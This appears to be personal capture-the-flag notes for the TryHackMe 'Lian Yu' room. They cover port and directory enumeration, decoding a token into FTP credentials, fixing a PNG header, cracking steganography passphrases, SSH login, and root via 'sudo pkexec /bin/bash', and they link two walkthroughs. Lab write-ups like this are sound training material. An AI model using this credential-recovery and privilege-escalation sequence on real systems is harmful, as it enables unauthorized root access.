@@ -1,0 +1,103 @@
+Nmap
+	nmap -sCV -Pn 10.10.38.164 -oG nmap.txt
+		Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-20 16:12 MST
+		Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+		Nmap done: 1 IP address (0 hosts up) scanned in 3.03 seconds
+
+	
+dirsearch
+	dirsearch -u dirsearch -u http://10.10.38.164/
+		no results 
+	dirsearch -u http://10.10.38.164/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+		/island -- nothing serious 
+			Code word : vigilante
+	dirsearch -u http://10.10.38.164/island/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+		http://10.10.38.164/island/2100/
+			<!-- you can avail your .ticket here but how?   -->
+	dirsearch -u http://10.10.38.164/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+		wfuzz -u http://10.10.38.164/island/2100/FUZZ.ticket -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -c --hc 404 
+		or
+		dirsearch -u http://10.10.38.164/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e .ticket
+			
+			http://10.10.38.164/island/2100/green_arrow.ticket
+				This is just a token to get into Queen's Gambit(Ship)
+				RTy8yhBQdscX
+					base58 converter = !#th3h00d
+				FTP LOGIN 
+					ftp 10.10.38.164
+						username: vigilante
+						password: !#th3h00d
+							ls -la
+						 	get  Leave_me_alone.png  Queen's_Gambit.png aa.jpg
+						 display aa.jpg 
+						 	err.. improper image header
+						 
+						 hexeditor 
+						 	Leave_me_alone.png
+						 		edit the hex header... 
+						 			correct hex header = 89 50 4E 47 0D 0A 1A 0A
+						 		hexedit Leave_me alone.png
+						 			paste the correct hex 
+						 			password = password
+						 			or use stegcracker to crack the password
+						 			
+						 	steghide 
+						 		a forensic tool used to extract information
+						 		stegcracker aa.jpg
+						 		stegseek aa.jpg 
+						 			[i] Found passphrase: "password"
+									[i] Original filename: "ss.zip".
+									[i] Extracting to "aa.jpg.out". 
+						 		steghide extract -sf aa.jpg
+						 		
+						 		
+						 		
+						 		ssh slade@10.10.38.234
+						 			password : M3tahuman
+						 			ls
+						 				user.txt
+						 			sudo -l 
+						 				/usr/bin/pkexec
+						 			sudo /usr/bin/pkexec /bin/bash --gtfobins(change location )
+						 				root.txt
+						 			
+						 			
+						 			
+						 			
+						 			
+						 			
+						 
+			
+			
+
+https://github.com/AdaniKamal/TryHackMe/blob/master/Lian-Yu/Write-Up.md
+
+
+
+It looks like we have three images. Two are png and one is jpg. I tried opening up the file Leave_me_alone.jpg It looks like this file is currently corrupted. I opened the image in hexeditor and noticed that the first 6 hex characters are not correct for png file. I changed it to 89 50 4E 47 0D 0A.
+
+						
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+https://capearso.com/LianYu-THM-walkthrough/
